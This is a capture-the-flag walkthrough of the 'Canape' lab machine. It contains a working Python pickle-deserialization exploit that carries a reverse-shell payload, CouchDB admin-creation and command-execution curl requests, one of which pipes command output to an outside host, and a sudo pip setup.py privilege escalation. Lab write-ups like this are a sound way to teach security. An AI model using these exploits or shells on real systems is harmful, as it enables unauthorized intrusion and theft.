# Canape

## User

This was my favorite machine so far. Thanks: @overcast!.
So, as always, lets start with nmap:

```bash
$> nmap -sC -sV 10.10.10.70  > nmap
```

And here is the output:

![nmap canape](./images/canape/nmap.png)

Great, while we go to the HTTP server, I'll let an nmap full scan running..
Once we connect to the HTTP server we find some stuff related with The Simpsons, nothing interesting yet..
Looking to the source code of the main page, we find this: 

![commit source code](./images/canape/hash_commit_source_code.png)

Ok..  Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck.  Then, I realized that the nmap has discovered a **.git** directory, so I proceed to download it: 

```bash
$> wget --recursive --no-parent http://10.10.10.70/.git/
``` 

Once I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application.

![logs](./images/canape/git_logs.png)

Just in a few words, this application had to main entrypoints:

* **submit**: Where you can submit your quote, and it will stored using **Pickle**.
* **check**: Where it will load the content of your quote **as a Pickle** and show it back to you.

I searched for some tutorials of how to exploit this and fortunately I found a couple of them. 

So, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working.

I started to go back on my steps, and figured it out something crucial. The **submit** endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character & quote content: 

```python
...
p_id = base64.b64encode(char + quote)[:10]
...
```

Or.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash 
of the concatenation:

```
git show 524f9ddcc74e10aba7256f91263c935c6dfb41e1
    -    p_id = base64.b64encode(char + quote)[:10]
    +    p_id = md5(char + quote).hexdigest()
```

So I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit. 

This was final version of the python application:

```python
import string
import random
import base64
import cPickle
from flask import Flask, render_template, request
from hashlib import md5

app = Flask(__name__)

@app.errorhandler(404)
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
	return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            print "Char: {}]\nQuote:{}".format(char,quote)
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                #p_id = base64.b64encode(char + quote)[:10]
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    if error:
        return "<html><p1>error</p1></html>"
    else:
        return "<html><p1>success</p1></html>"
    #return "render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    print request.form["id"]
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data
    print item
    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run(host="0.0.0.0")
```
(it may be a little modified, but the core parts are there.)
So with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this: 

```python
import requests
#import base64
from hashlib import md5

PATH_REMOTE = "http://10.10.10.70/{}"
PATH_LOCAL = "http://192.168.0.15:5000/{}"
REMOTE = True

def submit_exploit(cmd):
    action = 'submit'
    char = "S'homer'\np1\ncos\nsystem\n(S'{cmd}'\ntRS'marge'\np1\n".format(cmd=cmd)
    quote = '.'
    payload = "character={char}&quote={quote}".format(char=char,quote=quote)
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)
    print payload
    r = requests.post(path, data=payload, headers=headers)
    if r.status_code == 200 and ("thank you for your suggestion" in r.text.lower() or 'success' in r.text.lower()): 
        print "[+] Payload successfully sent. Command: {cmd}".format(cmd=cmd)
        #return base64.encodestring(char+quote)[:10]
        return md5(char+quote).hexdigest()
    else:
        print "[-] Error sending payload"
        raise Exception("Error sending payload: \n\tHttp code returned: {http_code}. \n\t response body:\n {body}".format(http_code= r.status_code, body=r.text))

def check_and_run_exploit(id_code):
    action = 'check'
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    payload = "id={id_code}".format(id_code=id_code)
    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)
    r = requests.post(path, data=payload, headers=headers)
    if r.status_code == 200: 
        print "[+] Exploit successfully executed"
        return r.text
    else:
        print "[-] Error executing exploit"
        raise Exception("Error executing exploit: \n\tHttp code returned: {http_code}. \n\t response body:\n {body}".format(http_code= r.status_code, body=r.text))

if __name__ == "__main__":
    cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.255\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    id_code = submit_exploit(cmd)
    check_and_run_exploit(id_code)
```

Two disclaimers:

* The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail).
* The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one.

After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc).

![reverse shell](./images/canape/reverse_shell.png)

Although, we have a reverse shell, the user running the HTTP server is **www-data**, so we need to escalate privileges and log in as other user. 
Once inside the machine, my first move was to run **LinEnum.sh**. Once of the outputs of it was the following: 

![troll](./images/canape/troll.png)

I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a **BIG** troll.

Analyzing the applications running on the system and its ports, I found the **couchdb** running in localhost. 
I started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it: 

```bash
$> curl -X GET http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

I started playing around a little more and figured it out how to list dbs and docs inside them: 

```bash
$> curl -X GET http://localhost:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
$> curl -X GET http://localhost:5984/simpsons/_all_docs
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
$> curl -X GET http://localhost:5984/passwords/_all_docs
{"error":"unauthorized","reason":"You are not a server admin."}
```

So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this **EXCELENT** [blogpost](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html). Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog).

I changed (just the names) a little bit the PoC of the blog and executed against the db: 

```bash
$> curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{
  "type": "user",
  "name": "tsuller",
  "roles": ["_admin"],
  "roles": [],
  "password": "tsuller"
}'
{"ok":true,"id":"org.couchdb.user:tsuller","rev":"1-0b547bb36cb610ec21d9571312f6e20c"}
```

Yes! Seems that it worked! Lets check:

```bash
$> curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

YES! Worked. Lets dump the content of each doc:

```bash
$> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
$> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
$> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
$> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```

If we pay atenttion to the **home** directory, we'll just find **homer** user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the **ssh** one) worked, and seconds later I was able to get the user flag: 

![user_flag](./images/canape/user_flag.png)

## Root 

To start, I ran again the **LinEnum.sh** but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction.

In some moment, I thought that the couchdb was running as **root**. I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also **couchy** (look the docs of the **password** db) was admin. 
Thanks to this [blogpost](https://www.octority.com/2017/05/16/from-couchdb-admin-to-remote-code-execution/) first, and a little help from [this](https://stackoverflow.com/questions/37401355/cant-create-server-admin-in-couchdb) also I was able to successfully execute commands: 

```bash
curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '"whoami | curl http://10.10.14.255:5555 -d @-"'  --insecure
curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure
curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{"_id":"770855a97726d5666d70a22173005c77"}' --insecure
curl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json' --insecure
```
Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the **whoami** wasn't root but homer. I must have confused with some other running process. 

I continued looking for some interesting thing, but nothing showed up. 

During that search, I issued: 
```bash
sudo -l 
```

And this was the output:
![sudoers][./images/canape/sudoers.png]

For those not very familiar, this means that the user **homer** can run as **root** the command **pip install** without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this?

**PIP** is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called **setup.py** which is the one in charge of really installing the package in your enviroment (virtual env or general env). 

So my idea was to, download a compressed version of package that already exists (I pick **request** because is my favourite lib), modify it's code, compress it again and try to install it using sudo:

* Downloaded the source code from [here](https://pypi.org/project/requests/).
* Decompressed it.
* Added the following line to the setup.py:
```python
os.system('cat /root/root.txt > /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p')
```
(I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes)
* Compressed it again.
* Served it in a python serve so you can copy it to the machine .
* Executed:
```bash
sudo /usr/bin/pip install blablabla.tar.gz
```
* Read the flag from **/tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p**
* Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.

![root](./images/canape/root.png)
